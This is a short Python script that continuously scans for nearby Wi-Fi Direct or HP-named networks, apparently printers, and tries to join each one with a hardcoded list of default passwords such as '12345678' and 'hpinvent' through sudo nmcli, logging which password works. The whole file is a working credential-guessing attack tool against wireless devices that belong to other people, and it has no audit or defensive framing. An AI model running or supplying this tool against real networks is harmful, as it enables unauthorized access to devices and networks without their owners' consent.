import nmcli
import os
import subprocess as sp

INTERFACE = os.getenv("INTERFACE")
PASSWORDS = ["12345678", "00000000", "password", "hpinvent"]

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    ENDC = '\033[0m'


def log(color: str, message: str):
    if color == "none" or color == "white":
        print(f" {message}")
    if color == "green":
        print(f"{Colors.GREEN} {message} {Colors.ENDC}")
    if color == "red":
        print(f"{Colors.RED} {message} {Colors.ENDC}")


def scan(interface: str):
    nmcli.device.wifi_rescan(ifname=interface)
    return nmcli.device.wifi(ifname=interface)


def direct_networks(networks: list):
    direct_networks = []
    for network in networks:
        if network.ssid == '' or network.ssid == None:
            continue

        if "direct" in network.ssid.lower() or "hp" in network.ssid.lower():
            direct_networks.append(network)

    return direct_networks


def try_passwords(network: nmcli.DeviceWifi, passwords: list):
    for password in passwords:
        try:
            result = sp.run([
                'sudo', 'nmcli', 'dev', 'wifi', 'connect', network.ssid,
                'password', password,
                'ifname', INTERFACE,
            ], capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                log("green", f"[*] Connected to network {network.ssid} with password {password}")

                sp.run(['sudo', 'nmcli', 'connection', 'delete', network.ssid], 
                    capture_output=True, timeout=10)

                return
            else:
                log("red", f"[*] Password {password} for network {network.ssid} invalid")
                sp.run(['sudo', 'nmcli', 'connection', 'delete', network.ssid], 
                    capture_output=True, timeout=10)
                
        except sp.TimeoutExpired:
            log("red", f"[*] Connection attempt timed out for {network.ssid} with password {password}")
        except Exception as e:
            log("red", f"[*] Error trying password {password} for network {network.ssid}")
            print(f"    Error: {e}")


def main():
    while True:
        networks = scan(INTERFACE)
        networks_d = direct_networks(networks)

        if networks_d != []:
            log("none", "[*] DIRECT networks found")

        for network in networks_d:
            try_passwords(network, PASSWORDS)


if __name__ == "__main__":
    main()
